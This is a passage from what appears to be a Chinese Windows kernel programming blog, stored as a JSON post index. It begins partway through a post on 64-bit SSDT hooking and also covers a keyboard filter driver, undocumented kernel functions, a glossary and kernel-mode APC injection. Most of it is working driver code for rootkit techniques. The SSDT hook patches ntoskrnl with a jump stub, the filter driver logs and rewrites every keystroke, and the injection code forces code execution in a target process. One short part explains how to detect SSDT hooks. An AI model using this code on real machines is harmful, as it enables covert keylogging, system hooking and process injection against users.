KdPrintEx((77, 0, \"ntosklAddr : %llx\\r\\n\", ntosklAddr)); sprintf(result, \"%s%llx\\t%llx\\n\", result, ntosklAddr, (SsdtBase - ntosklAddr)); return STATUS_SUCCESS; } EXTERN_C VOID RealHookFunc() { KdPrintEx((77, 0, \"oldFunAddr : %llx\\thookPlace : %llx\\r\\n\", oldFunAddr, hookPlace)); } VOID FuckBlankArea(PULONG_PTR hookPlace) { KIRQL irql; ULONGLONG myfun; UCHAR jmp_code[] = \"\\x48\\xB8\\xFF\\xFF\\xFF\\xFF\\xFF\\xFF\\xFF\\x00\\xFF\\xE0\"; myfun = (ULONGLONG)SSDTHookEntry; memcpy(jmp_code + 2, &amp;myfun, 8); irql = CloseWriteProtection(); memset(hookPlace, 0x90, 15); memcpy(hookPlace, jmp_code, 12); OpenWriteProtection(irql); } VOID SaveFuncAddress(ULONG id) { ULONG_PTR SsdtBase = *(PULONG_PTR)KeServiceDescriptorTable; DWORD32 offset = NULL; DWORD32 SafeFlag; ULONG_PTR SsdtFuncAddr = NULL; offset = *(PULONG)((PCH)SsdtBase + 4 * id); if (offset &amp; 0x80000000) { SsdtFuncAddr = 0xfffffffeffffffff &amp; (SsdtBase + (0xf0000000 | (offset >> 4))); } else { SsdtFuncAddr = (offset >> 4) + SsdtBase; } oldFunAddr = SsdtFuncAddr; } ULONG GetOffsetAddress(ULONGLONG FuncAddr) { ULONG dwtmp = 0; ULONG_PTR SsdtBase = *(PULONG_PTR)KeServiceDescriptorTable; dwtmp = (ULONG)(FuncAddr - (ULONGLONG)SsdtBase); return dwtmp &lt;&lt; 4; } VOID HookSSDT(ULONG id) { if (oldFunAddr)return; KIRQL irql; ULONGLONG dwtmp = 0; PULONG SsdtBase = *(PULONG_PTR)KeServiceDescriptorTable; if (!hookPlace) { hookPlace = searchCode(\"ntoskrnl.exe\", \".text\", \"000000000000000000000000000000\", 0); FuckBlankArea(hookPlace); } SaveFuncAddress(id); irql = CloseWriteProtection(); SsdtBase[id] = GetOffsetAddress((ULONGLONG)hookPlace); OpenWriteProtection(irql); } VOID UnHookSSDT(ULONG id) { if (oldFunAddr == NULL)return; KIRQL irql; ULONGLONG dwtmp = 0; PULONG SsdtBase = *(PULONG_PTR)KeServiceDescriptorTable; irql = CloseWriteProtection(); SsdtBase[id] = GetOffsetAddress((ULONGLONG)oldFunAddr); memset(hookPlace, 0, 15); OpenWriteProtection(irql); oldFunAddr = NULL; hookPlace = NULL; } SSDT Hook的检测32位下的检测方法，通常是直接判断SSDT调用的函数是否是ntoskrnl.exe模块内的即可判断是否SSDT被HOOK了。 而通过上述64位下的代码，可以知道这种检测方法已经失效，因为修改后的调用地址仍然在ntoskrnl.exe模块内。 所以我们的检测方法同样需要更新 具有通用性的检测方法是将文件原始数据与内存数据做对比，判断是否被修改过。 这个判断可以直接在R3下完成。 检测的地方也有坑点，比如Win7下文件映像中SSDT表项为8字节、而Win10则为4字节。 SSDT检测代码#pragma once #include \"SsdtCheck.h\" #include &lt;stdio.h> HMODULE hModule = NULL; ULONG_PTR GetOriServiceAddr(DWORD ServiceId,DWORD TableOffset,ULONG_PTR baseaddr, DWORD OsMode) { if (!hModule) return 0; ULONGLONG ServiceAddr = NULL; if (OsMode == 1) { ServiceAddr = *(PULONG)((PCH)hModule + TableOffset + 4 * ServiceId); return baseaddr + ServiceAddr; } else { ServiceAddr = *(PULONGLONG)((PCH)hModule + TableOffset + 8 * ServiceId); return baseaddr + ServiceAddr - (ULONGLONG)hModule; } } EXTERN_C __declspec(dllexport) PCH GetAllChecks(DWORD MaxId, DWORD TableOffset, ULONG_PTR baseaddr,DWORD OsMode) { if(!hModule)hModule = LoadLibraryA(\"C:\\\\Windows\\\\System32\\\\ntoskrnl.exe\"); PCH result = (PCH)malloc(20480); memset(result, 0, 20480); ULONG_PTR tmpAdd = NULL; for (size_t i = 0; i &lt; MaxId; i++) { tmpAdd = GetOriServiceAddr(i, TableOffset, baseaddr, OsMode); sprintf(result, \"%s%llx\\n\", result,tmpAdd); } return result; } 效果演示","categories":[],"tags":[{"name":"代码","slug":"代码","permalink":"http://example.com/tags/%E4%BB%A3%E7%A0%81/"},{"name":"内核","slug":"内核","permalink":"http://example.com/tags/%E5%86%85%E6%A0%B8/"}]},{"title":"键盘驱动过滤","slug":"KbdDriver","date":"2021-08-16T09:17:53.000Z","updated":"2021-10-25T08:16:39.499Z","comments":true,"path":"2021/08/16/KbdDriver/","link":"","permalink":"http://example.com/2021/08/16/KbdDriver/","excerpt":"","text":"在R3对键盘进行监控容易被查。我们可以通过附加驱动设备的方式，对键盘设备的IRP包过滤，从而修改达到键盘监控、修改的效果。 #include &lt;ntifs.h> #include &lt;ntddkbd.h> typedef struct _DEVICE_EXTENSION { PDRIVER_OBJECT pDriverObject;//驱动对象 PDEVICE_OBJECT pDevice;//设备对象 PDEVICE_OBJECT pTarget;//挂载的下层 LONG nIrpsInQueue; //Irp 队列中剩余 未操作完成的IRP数量 PIRP pLastIrp; //保存每次转发的IRP，当卸载驱动的时候这个保存的是最后一个IRP //通过取消这个IRP 来完成所有的IRP }DEVICE_EXTENSION,*PDEVICE_EXTENSION; //底层设备完成IRP之后调用此函数 //在此函数中完成对数据的修改 NTSTATUS ReadCompleteRoutine(PDEVICE_OBJECT pDeviceObject, PIRP Irp, PVOID pContext) { NTSTATUS status = STATUS_UNSUCCESSFUL; PKEYBOARD_INPUT_DATA pKID; int iNum,//按键数量 i;//for 循环用的 PDEVICE_OBJECT pDeviceFilter = (PDEVICE_OBJECT)pDeviceObject; PDEVICE_EXTENSION pExt = (PDEVICE_EXTENSION)pDeviceFilter->DeviceExtension; status = Irp->IoStatus.Status; //成功IRP if (NT_SUCCESS(status)) { //缓冲区保存了多个 按键信息 pKID = (PKEYBOARD_INPUT_DATA)Irp->AssociatedIrp.SystemBuffer; //按键数量 iNum = Irp->IoStatus.Information / sizeof(KEYBOARD_INPUT_DATA); for (i = 0; i &lt; iNum; i++) { switch (pKID->Flags) { case KEY_MAKE: KdPrintEx((77,0,\"[+] %d Down\\n\", pKID->MakeCode)); break; case KEY_BREAK: KdPrintEx((77,0,\"[+] %d Up\\n\", pKID->MakeCode)); break; } //可以添加上这这一句，然后按键全部被改为了 按下 A pKID->MakeCode = 0x1e; pKID++; } } // if (Irp->PendingReturned) { IoMarkIrpPending(Irp); } pExt->nIrpsInQueue--; status = Irp->IoStatus.Status; return status; } //默认处理方式 NTSTATUS DefHandler(PDEVICE_OBJECT DeviceObject, PIRP Irp) { IoSkipCurrentIrpStackLocation(Irp); //转发 return IoCallDriver(((PDEVICE_EXTENSION)DeviceObject->DeviceExtension)->pTarget, Irp); } //处理irp并添加回调 NTSTATUS HandlerRead(PDEVICE_OBJECT DeviceObject, PIRP Irp) { NTSTATUS status = STATUS_UNSUCCESSFUL; KdPrintEx((77,0,\"[+] READ:\")); PDEVICE_EXTENSION pExt = (PDEVICE_EXTENSION)DeviceObject->DeviceExtension; IoCopyCurrentIrpStackLocationToNext(Irp); IoSetCompletionRoutine(Irp, ReadCompleteRoutine, DeviceObject, TRUE, TRUE, TRUE); //增加IRP 队列长度 pExt->nIrpsInQueue++; pExt->pLastIrp = Irp; return IoCallDriver(pExt->pTarget, Irp); } //电源处理函数，XP必须指定 Vista 以上可以忽略 NTSTATUS HandlerPower(PDEVICE_OBJECT DeviceObject, PIRP Irp) { PDEVICE_EXTENSION pExt = (PDEVICE_EXTENSION)DeviceObject->DeviceExtension; PoStartNextPowerIrp(Irp); IoSkipCurrentIrpStackLocation(Irp); return PoCallDriver(pExt->pTarget, Irp); } //安装键盘钩子 NTSTATUS HookKbdRead(PDRIVER_OBJECT pDriverObject) { NTSTATUS status = STATUS_UNSUCCESSFUL; PDEVICE_OBJECT pDevice; PDEVICE_EXTENSION pExt = NULL; UNICODE_STRING uFdevice; RtlInitUnicodeString(&amp;uFdevice, L\"\\\\Device\\\\f012345555\"); //首先创建自己的过滤设备 status = IoCreateDevice(pDriverObject, sizeof(DEVICE_EXTENSION), &amp;uFdevice, FILE_DEVICE_KEYBOARD, 0, FALSE, &amp;pDevice); if (!NT_SUCCESS(status)) { KdPrintEx((77,0,\"[+] Create Filter Failed...\\r\\n\")); return status; } pExt = (PDEVICE_EXTENSION)pDevice->DeviceExtension; //初始化设备扩展 pExt->nIrpsInQueue = 0; pExt->pDevice = pDevice; pExt->pDriverObject = pDriverObject; pExt->pTarget = NULL; //获取到键盘驱动指针 UNICODE_STRING uKeyDevice; PFILE_OBJECT pKeyFile = NULL; PDEVICE_OBJECT pTargetDevice = NULL; RtlInitUnicodeString(&amp;uKeyDevice, L\"\\\\Device\\\\KeyboardClass0\"); //获取到键盘设备栈顶 的设备 status = IoGetDeviceObjectPointer(&amp;uKeyDevice, GENERIC_READ | GENERIC_WRITE, &amp;pKeyFile, &amp;pTargetDevice); //引用-1 ObReferenceObject(pKeyFile); if (!NT_SUCCESS(status)) { KdPrintEx((77,0,\"[+] IoGetDeviceObjectPointer Failed\\r\\n\")); IoDeleteDevice(pDevice); return status; } //执行绑定操作 pExt->pTarget = IoAttachDeviceToDeviceStack(pDevice, pTargetDevice); if (pExt->pTarget == NULL) { IoDeleteDevice(pDevice); return status; } KdPrintEx((77,0,\"[+] Bind Filter Successful!\\r\\n\")); pDevice->Flags |= DO_BUFFERED_IO | DO_POWER_PAGABLE; pDevice->ActiveThreadCount &amp;= ~DO_DEVICE_INITIALIZING; status = STATUS_SUCCESS; return status; } //卸载驱动 void UnLoad(PDRIVER_OBJECT pDriverObject) { PDEVICE_OBJECT pDevice = NULL; LARGE_INTEGER liDelay; pDevice = pDriverObject->DeviceObject; if (NULL == pDevice) { return; } if (pDevice->DeviceExtension == NULL) { return; } PDEVICE_EXTENSION pExt = (PDEVICE_EXTENSION)pDevice->DeviceExtension; //首先要移除设备栈,移除之后的IRP将不会被过滤 IoDetachDevice(pExt->pTarget); //对于为完成的IRP，因为只前通过IoSetCompletionRoutine已经设置IO完成例程 //那么对于未完成的IRP ，在完成之后会调用 该层设备的函数 //如果 IRP队列还在，这时候直接删除设备 //当剩余的IRP 完成之后 之前设置的IO完成例程已经不存在了 //这样会照成 蓝屏 //所以需要等待 IO 完成之后再去删除 该层设备 liDelay.QuadPart = -1000000; while (pExt->nIrpsInQueue > 0) { KeDelayExecutionThread(KernelMode, FALSE, &amp;liDelay); KdPrintEx((77,0,\"[+] Left IRP : %d\\r\\n\", pExt->nIrpsInQueue)); if (pExt->nIrpsInQueue == 1) { //取消掉最后一个IRP IoCancelIrp(pExt->pLastIrp); } } //移除设备 KdPrintEx((77,0,\"[+] Driver Unloaded\\r\\n\")); IoDeleteDevice(pDevice); return; } #ifdef __cplusplus extern \"C\" NTSTATUS DriverEntry(IN PDRIVER_OBJECT DriverObject, IN PUNICODE_STRING RegistryPath); #endif NTSTATUS DriverEntry(IN PDRIVER_OBJECT DriverObject, IN PUNICODE_STRING RegistryPath) { KdPrintEx((77,0,\"[+] Driver Loaded\\r\\n\")); ULONG i; for (i = 0; i &lt;= IRP_MJ_MAXIMUM_FUNCTION; i++) { DriverObject->MajorFunction[i] = DefHandler; } //拦截Read DriverObject->MajorFunction[IRP_MJ_READ] = HandlerRead; //电源处理 DriverObject->MajorFunction[IRP_MJ_POWER] = HandlerPower; //卸载 DriverObject->DriverUnload = UnLoad; //安装过滤 return HookKbdRead(DriverObject);; } 效果如图所示","categories":[],"tags":[{"name":"代码","slug":"代码","permalink":"http://example.com/tags/%E4%BB%A3%E7%A0%81/"},{"name":"内核","slug":"内核","permalink":"http://example.com/tags/%E5%86%85%E6%A0%B8/"}]},{"title":"未文档化的函数的记录","slug":"unDocumentedFunc","date":"2021-08-15T11:52:38.000Z","updated":"2021-10-25T08:03:50.794Z","comments":true,"path":"2021/08/15/unDocumentedFunc/","link":"","permalink":"http://example.com/2021/08/15/unDocumentedFunc/","excerpt":"","text":"未文档化导出函数： EXTERN_C HANDLE PsGetThreadId(__in PETHREAD Thread); 这个函数用于获取_EPROCESS.CID.UniqueThread EXTERN_C HANDLE PsGetThreadProcessId( __in PETHREAD Thread); 这个函数用于获取_EPROCESS.CID.UniqueProcess EXTERN_C PVOID NTAPI PsGetProcessWow64Process(PEPROCESS Process); 这个函数用于获取_EPROCESS.WoW64Process EXTERN_C PVOID NTAPI PsGetProcessPeb(PEPROCESS Process); 这个函数用于获取_EPROCESS.Peb NTSTATUS MmCopyVirtualMemory( IN PEPROCESS FromProcess, IN CONST VOID *FromAddress, IN PEPROCESS ToProcess, OUT PVOID ToAddress, IN SIZE_T BufferSize, IN KPROCESSOR_MODE PreviousMode, OUT PSIZE_T NumberOfBytesCopied ); NtWriteProcessMemory / NtReadProcessMemory 都是通过这个函数进行实现的。 可以通过这个函数避免内存缺页造成蓝屏的问题。 // 声明微软未公开的ObReferenceObjectByName()函数 NTSTATUS ObReferenceObjectByName( PUNICODE_STRING ObjectName, ULONG Attributes, PACCESS_STATE AccessState, ACCESS_MASK DesiredAccess, POBJECT_TYPE ObjectType, KPROCESSOR_MODE AccessMode, PVOID ParseContest, PVOID* Object ); extern POBJECT_TYPE* IoDriverObjectType; extern POBJECT_TYPE* IoDeviceObjectType; 使用这个函数可以通过设备\\驱动名字找到设备\\驱动对象。","categories":[],"tags":[{"name":"内核","slug":"内核","permalink":"http://example.com/tags/%E5%86%85%E6%A0%B8/"},{"name":"笔记","slug":"笔记","permalink":"http://example.com/tags/%E7%AC%94%E8%AE%B0/"}]},{"title":"专有名词及解释","slug":"Names","date":"2021-08-15T11:51:29.000Z","updated":"2021-10-25T08:07:13.690Z","comments":true,"path":"2021/08/15/Names/","link":"","permalink":"http://example.com/2021/08/15/Names/","excerpt":"","text":"术语 含义 描述符 指用来描述一件事物的“结构体”。如缓冲描述符，描述了一个缓冲的基址、长度等信息。 中断描述符 描述了那个中断向量对应的分配状态、isr 等信息 Entry 指表中的表项、条目，有时也指函数入口 SSDT 基本系统服务表(其实全称应叫系统服务派遣表) Shadow SSDT GUI/GDI 系统服务函数表，这是第二张 SSDT SSDTDT 系统服务表描述符表，表中每个元素是一个 SSDT 描述符(注意内核中有两张 SSDT 和两张 SSDTDT) GDT 全局描述符表 IDT 中断描述符表，每个cpu 一个。(每个表项是一个描述符，可以简单视为 isr) ISR 中断服务例程，IDT 表中的中断描述符所描述的中断处理函数 EPR 异常处理例程，IDT 表中的异常描述符所描述的异常处理函数 VA 虚拟地址 PA 物理地址 LA 线性地址 RVA 相对虚拟地址 FOA 文件偏移 PDE 页目录中的表项，保存着对应二级页表的物理地址，又叫“二级页表描述符” PTE 二级页表中的表项，真正记录着每个虚拟页面的映射情况以及其他信息，又叫“映射描述符” 页目录 (又叫一级页表、总页表)，一个 PDE 数组，这个数组的大小刚好占据一个页面 二级页表 一个 PTE 数组，这个数组的大小也刚好占据一个页面(进程有一个总页表+1024 个二级页表) AREA 地址空间中的一块连续的区段，VirtualAlloc 分配内存都是以区段为单位 内存分配 表示从地址空间中用 VirtualAlloc 预定或者提交映射一块内存，不是指 malloc、new、HeapAlloc PID 进程 ID、进程号。(其实也是个句柄) TID 线程 ID、线程号。(其实也是个句柄) PDO 物理设备对象，相对于 fdo 而言。Pdo 并不一定是最底层的那个硬件 FDO 功能设备对象，相对于 pdo 而言。Fdo 也可能直接访问硬件芯片。fdo 与 pdo 只是一种相对概念。 栈底pdo 又叫基石pdo，硬件pdo，指用作堆栈基石的那个pdo，它是由相应的总线驱动内部创建的 端口设备对象 端口驱动或者小端口驱动中创建的设备对象(他下面是硬件 pdo) 总线驱动 用来驱动总线的驱动(总线本身也是一种特殊的设备)，如 pci.sys 总线驱动 端口驱动 由厂家提供的真正用来直接访问硬件芯片的驱动，位于总线驱动上层 功能驱动 指类驱动。如鼠标类驱动 mouseclass.sys，磁盘类驱动 disk.sys 上层过滤驱动 位于功能类驱动上面的驱动 下层过滤驱动 位于功能驱动下面，端口驱动上面的驱动 顶层驱动 指位于栈顶的驱动 中间驱动 intermediate drivers，凡是夹在顶层驱动与端口驱动之间的那些驱动都叫中间驱动 设备树 由 PnP 管理器构造的一颗用来反映物理总线布局的‘硬件设备树’。 设备节点 设备树中的节点。每个节点都表示一个真正的‘硬件 pdo’ 老式驱动 即 NT 式驱动，指不提供 AddDevice 或通过 NtLoadDriver 加载的驱动 WDM 驱动 指提供了 AddDevice 并且不是通过 NtLoadDriver 加载的驱动 IRP 派遣例程 又叫分发例程、派遣函数。驱动程序中用来响应处理 irp 的函数。(Dispatch) 设备绑定 指将设备‘堆栈’到原栈顶设备上面，成为新的栈顶设备。 文件 指物理介质上的文件(磁盘、光盘、U 盘) 文件对象 每次打开设备时生成一个文件对象(文件对象不是文件，仅仅表示对设备的一次打开上下文，因此文件对象又叫打开者) 套接字驱动 afd.sys 套接字设备 \\Device\\Afd\\Endpoint 套接字文件对象 每打开一次套接字设备生成一个套接字文件对象 套接字FCB 每个套接字文件对象关联的FCB，用来描述套接字的其他信息 地址文件对象 每次打开传输层的tdi设备时生成的一个文件对象，用于套接字绑定 地址对象 传输层中为每个地址文件对象创建一个地址对象，用来描述一个地址(IP、端口号、协议等) Socket irp 发往 afd 套接字设备(即\\Device\\Afd\\Endpoint)的irp Tdi irp 发往传输层设备(即\\Device\\Tcp,\\Device\\Udp,\\Device\\RawIp)的 irp 物理卷设备 指磁盘卷、光盘卷、磁带卷等物理卷设备，由相应类型的硬件驱动创建 磁盘卷设备 指磁盘分区，设备对象名为\\Device\\HarddiskN\\PartitionN 形式(N 从 0 开始) 文件卷设备 由文件系统内部创建的挂载(即绑定)在物理卷上的匿名设备 Cdo 控制设备对象。一个驱动通常创建有一个cdo，用来与外界通信。 FSD 文件系统驱动，File System Driver缩写。 簇 文件以簇为分配单位。一个文件包含N个簇，簇之间不必物理连续，一个簇一般为 4KB 扇区 系统以扇区为单位进行磁盘 IO。一个簇包含 N 个扇区，一个扇区一般为 512B 文件块 磁盘文件中的文件块，对应于内核中的文件缓冲段 缓冲段 文件块在内核中的缓冲 ACL 访问控制表。每个 Ntfs 文件、内核对象都有一份 ACL，记录了各用户、组的访问权限 Token 访问令牌。每个线程、进程都有一个 Token，记录了包含的特权、用户、组等信息 SID 指用户 ID、组 ID、机器 ID，用来唯一标识。 主令牌 进程自己的令牌 客户令牌 也即模拟令牌。每个线程默认使用进程的令牌，但也可模式使用其他进程的令牌","categories":[],"tags":[{"name":"内核","slug":"内核","permalink":"http://example.com/tags/%E5%86%85%E6%A0%B8/"},{"name":"笔记","slug":"笔记","permalink":"http://example.com/tags/%E7%AC%94%E8%AE%B0/"}]},{"title":"X64下内核注入用户APC","slug":"x64ApcInjection","date":"2021-08-15T11:39:27.000Z","updated":"2021-10-25T08:03:19.010Z","comments":true,"path":"2021/08/15/x64ApcInjection/","link":"","permalink":"http://example.com/2021/08/15/x64ApcInjection/","excerpt":"","text":"注入32位用户APC需要注意的是，64位下寻址32位的地址，需要做一次封装。 可以使用导出函数： EXTERN_C NTSTATUS PsWrapApcWow64Thread(PVOID* ApcContext, PVOID* ApcRoutine); 完整的代码如下 R0： #include &lt;ntifs.h> typedef enum _KAPC_ENVIRONMENT { OriginalApcEnvironment, AttachedApcEnvironment, CurrentApcEnvironment, InsertApcEnvironment } KAPC_ENVIRONMENT; typedef VOID(*PKNORMAL_ROUTINE) ( IN PVOID NormalContext, IN PVOID SystemArgument1, IN PVOID SystemArgument2 ); typedef VOID(*PKKERNEL_ROUTINE) ( IN struct _KAPC* Apc, IN OUT PKNORMAL_ROUTINE* NormalRoutine, IN OUT PVOID* NormalContext, IN OUT PVOID* SystemArgument1, IN OUT PVOID* SystemArgument2 ); typedef VOID(*PKRUNDOWN_ROUTINE) ( IN struct _KAPC* Apc ); VOID KeInitializeApc( __out PRKAPC Apc, __in PRKTHREAD Thread, __in KAPC_ENVIRONMENT Environment, __in PKKERNEL_ROUTINE KernelRoutine, __in_opt PKRUNDOWN_ROUTINE RundownRoutine, __in_opt PKNORMAL_ROUTINE NormalRoutine, __in_opt KPROCESSOR_MODE ApcMode, __in_opt PVOID NormalContext ); BOOLEAN KeInsertQueueApc( __inout PRKAPC Apc, __in_opt PVOID SystemArgument1, __in_opt PVOID SystemArgument2, __in KPRIORITY Increment ); BOOLEAN KeAlertThread( __inout PKTHREAD Thread, __in KPROCESSOR_MODE AlertMode ); EXTERN_C NTSTATUS PsWrapApcWow64Thread(PVOID* ApcContext, PVOID* ApcRoutine); EXTERN_C HANDLE PsGetThreadProcessId(__in PETHREAD Thread); EXTERN_C VOID kernelRoutineFunc( IN struct _KAPC* Apc, IN OUT PKNORMAL_ROUTINE* NormalRoutine, IN OUT PVOID* NormalContext, IN OUT PVOID* SystemArgument1, IN OUT PVOID* SystemArgument2 ) { KdPrintEx((77, 0, \"[+]:kernelRoutineFunc pid : %d\\r\\n\", PsGetCurrentProcessId())); ULONG64 addr = 0x401000; PsWrapApcWow64Thread(NULL, &amp;addr); ////DbgBreakPoint(); *NormalRoutine = addr; ExFreePool(Apc); } PEPROCESS FindProcessByNameFromIndex(PWCH name, int startPid) { PEPROCESS Process = NULL; PEPROCESS findProcess = NULL; for (int i = startPid; i &lt; 0x1000000; i++) { NTSTATUS status = PsLookupProcessByProcessId((HANDLE)i, &amp;Process); if (!NT_SUCCESS(status))continue; PUNICODE_STRING ProcessName = NULL; status = SeLocateProcessImageName(Process, &amp;ProcessName); if (!NT_SUCCESS(status)) { ObDereferenceObject(Process); continue; } if (ProcessName->Length) { _wcsupr(ProcessName->Buffer); if (wcsstr(ProcessName->Buffer, name) != 0) { findProcess = Process; ExFreePoolWithTag(ProcessName, 0); break; } } ObDereferenceObject(Process); } return findProcess; } VOID DrivUnload(PDRIVER_OBJECT DriverObject) { } NTSTATUS DriverEntry(PDRIVER_OBJECT pDriver, PUNICODE_STRING pReg) { //DbgBreakPoint(); pDriver->DriverUnload = DrivUnload; PKAPC pApc = ExAllocatePool(NonPagedPool, sizeof(KAPC)); if (pApc == NULL) { return STATUS_SUCCESS; } memset(pApc, 0, sizeof(KAPC)); PKEVENT pEvent = ExAllocatePool(NonPagedPool, sizeof(KEVENT)); if (pEvent == NULL) { ExFreePool(pApc); return STATUS_SUCCESS; } memset(pEvent, 0, sizeof(KEVENT)); ULONG AllProcessId = 8; NTSTATUS is = NULL; PEPROCESS TargetProc = NULL; do { TargetProc = FindProcessByNameFromIndex(L\"APCTEST.EXE\", AllProcessId); if (TargetProc == NULL)break; KdPrintEx((77, 0, \"PEPROCESS : %llx\\r\\n\", TargetProc)); ULONG_PTR TargetProcId = *(PULONG_PTR)((PUCHAR)TargetProc + 0x2e8); PLIST_ENTRY ThreadListEntry = *(ULONG_PTR*)((PUCHAR)TargetProc + 0x488); PLIST_ENTRY head = ThreadListEntry; do { PETHREAD Ethread = (PUCHAR)ThreadListEntry - 0x6b8; if((ULONG_PTR)PsGetThreadProcessId(Ethread) == TargetProcId) { KdPrintEx((77, 0, \"Ethread Addr is %llx\\r\\n\", Ethread)); KeInitializeEvent(pEvent, SynchronizationEvent, FALSE); KeInitializeApc(pApc, Ethread, OriginalApcEnvironment, kernelRoutineFunc, NULL, 0x401000, UserMode, (PVOID)1); *((PUCHAR)Ethread + 0x74) |= 0x10; is = KeInsertQueueApc(pApc, pEvent, NULL, NULL); KeAlertThread(Ethread, UserMode); break; } ThreadListEntry = ThreadListEntry->Flink; } while (ThreadListEntry != head); AllProcessId = TargetProcId +4; } while (TRUE); if (!is) { ExFreePool(pApc); ExFreePool(pEvent); } else { KdPrintEx((77, 0, \"[+] KeInsertQueueApc Success\\r\\n\")); ExFreePool(pEvent); } return STATUS_SUCCESS; } 3环测试代码如下 // APCtest.cpp : 此文件包含 \"main\" 函数。程序执行将在此处开始并结束。 // #include &lt;iostream> #include &lt;Windows.h> VOID Test(PVOID param1, PVOID param2, PVOID param3) { printf(\"Apc Called\\r\\n\"); } int main() { printf(\"%d,Test = 0x%x\\r\\n\", GetCurrentThreadId(), Test); system(\"pause\"); while (1) { printf(\"--------------------\\r\\n\"); Sleep(10000); } return 0; } 测试效果： 注入64位用户APC0环代码如下： #include &lt;ntifs.h> typedef enum _KAPC_ENVIRONMENT { OriginalApcEnvironment, AttachedApcEnvironment, CurrentApcEnvironment, InsertApcEnvironment } KAPC_ENVIRONMENT; typedef VOID(*PKNORMAL_ROUTINE) ( IN PVOID NormalContext, IN PVOID SystemArgument1, IN PVOID SystemArgument2 ); typedef VOID(*PKKERNEL_ROUTINE) ( IN struct _KAPC* Apc, IN OUT PKNORMAL_ROUTINE* NormalRoutine, IN OUT PVOID* NormalContext, IN OUT PVOID* SystemArgument1, IN OUT PVOID* SystemArgument2 ); typedef VOID(*PKRUNDOWN_ROUTINE) ( IN struct _KAPC* Apc ); VOID KeInitializeApc( __out PRKAPC Apc, __in PRKTHREAD Thread, __in KAPC_ENVIRONMENT Environment, __in PKKERNEL_ROUTINE KernelRoutine, __in_opt PKRUNDOWN_ROUTINE RundownRoutine, __in_opt PKNORMAL_ROUTINE NormalRoutine, __in_opt KPROCESSOR_MODE ApcMode, __in_opt PVOID NormalContext ); BOOLEAN KeInsertQueueApc( __inout PRKAPC Apc, __in_opt PVOID SystemArgument1, __in_opt PVOID SystemArgument2, __in KPRIORITY Increment ); BOOLEAN KeAlertThread( __inout PKTHREAD Thread, __in KPROCESSOR_MODE AlertMode ); EXTERN_C NTSTATUS PsWrapApcWow64Thread(PVOID* ApcContext, PVOID* ApcRoutine); EXTERN_C HANDLE PsGetThreadProcessId(__in PETHREAD Thread); EXTERN_C VOID kernelRoutineFunc( IN struct _KAPC* Apc, IN OUT PKNORMAL_ROUTINE* NormalRoutine, IN OUT PVOID* NormalContext, IN OUT PVOID* SystemArgument1, IN OUT PVOID* SystemArgument2 ) { KdPrintEx((77, 0, \"[+]:kernelRoutineFunc pid : %d\\r\\n\", PsGetCurrentProcessId())); ULONG64 addr = 0x140001000; PULONG_PTR something = 0x140063000; //PsWrapApcWow64Thread(NULL, &amp;addr); //DbgBreakPoint(); *something = *something - 1; *NormalRoutine = addr; ExFreePool(Apc); } PEPROCESS FindProcessByNameFromIndex(PWCH name, int startPid) { PEPROCESS Process = NULL; PEPROCESS findProcess = NULL; for (int i = startPid; i &lt; 0x1000000; i++) { NTSTATUS status = PsLookupProcessByProcessId((HANDLE)i, &amp;Process); if (!NT_SUCCESS(status))continue; PUNICODE_STRING ProcessName = NULL; status = SeLocateProcessImageName(Process, &amp;ProcessName); if (!NT_SUCCESS(status)) { ObDereferenceObject(Process); continue; } if (ProcessName->Length) { _wcsupr(ProcessName->Buffer); if (wcsstr(ProcessName->Buffer, name) != 0) { findProcess = Process; ExFreePoolWithTag(ProcessName, 0); break; } } ObDereferenceObject(Process); } return findProcess; } VOID DrivUnload(PDRIVER_OBJECT DriverObject) { } NTSTATUS DriverEntry(PDRIVER_OBJECT pDriver, PUNICODE_STRING pReg) { //DbgBreakPoint(); pDriver->DriverUnload = DrivUnload; PKAPC pApc = ExAllocatePool(NonPagedPool, sizeof(KAPC)); if (pApc == NULL) { return STATUS_SUCCESS; } memset(pApc, 0, sizeof(KAPC)); PKEVENT pEvent = ExAllocatePool(NonPagedPool, sizeof(KEVENT)); if (pEvent == NULL) { ExFreePool(pApc); return STATUS_SUCCESS; } memset(pEvent, 0, sizeof(KEVENT)); ULONG AllProcessId = 8; NTSTATUS is = NULL; PEPROCESS TargetProc = NULL; do { TargetProc = FindProcessByNameFromIndex(L\"APCTEST.EXE\", AllProcessId); if (TargetProc == NULL)break; KdPrintEx((77, 0, \"PEPROCESS : %llx\\r\\n\", TargetProc)); ULONG_PTR TargetProcId = *(PULONG_PTR)((PUCHAR)TargetProc + 0x2e8); PLIST_ENTRY ThreadListEntry = *(ULONG_PTR*)((PUCHAR)TargetProc + 0x488); PLIST_ENTRY head = ThreadListEntry; do { PETHREAD Ethread = (PUCHAR)ThreadListEntry - 0x6b8; if((ULONG_PTR)PsGetThreadProcessId(Ethread) == TargetProcId) { KdPrintEx((77, 0, \"Ethread Addr is %llx\\r\\n\", Ethread)); KeInitializeEvent(pEvent, SynchronizationEvent, FALSE); KeInitializeApc(pApc, Ethread, OriginalApcEnvironment, kernelRoutineFunc, NULL, 0x140001000, UserMode, (PVOID)1); *((PUCHAR)Ethread + 0x74) |= 0x10; is = KeInsertQueueApc(pApc, pEvent, NULL, NULL); KeAlertThread(Ethread, UserMode); break; } ThreadListEntry = ThreadListEntry->Flink; } while (ThreadListEntry != head); AllProcessId = TargetProcId +4; } while (TRUE); if (!is) { ExFreePool(pApc); ExFreePool(pEvent); } else { KdPrintEx((77, 0, \"[+] KeInsertQueueApc Success\\r\\n\")); ExFreePool(pEvent); } return STATUS_SUCCESS; } 3环测试代码如下： // APCtest.cpp : 此文件包含 \"main\" 函数。程序执行将在此处开始并结束。 // #include &lt;iostream> #include &lt;Windows.h> ULONG_PTR something = 0x12345678; VOID Test(PVOID param1, PVOID param2, PVOID param3) { printf(\"Apc Called\\r\\n\"); } int main() { printf(\"Test Addr = %llx\\r\\n\", Test); while (1) { printf(\"Addr = %llx,something = 0x%llx\\r\\n\", &amp;something, something); printf(\"--------------------\\r\\n\"); Sleep(10000); } return 0; } 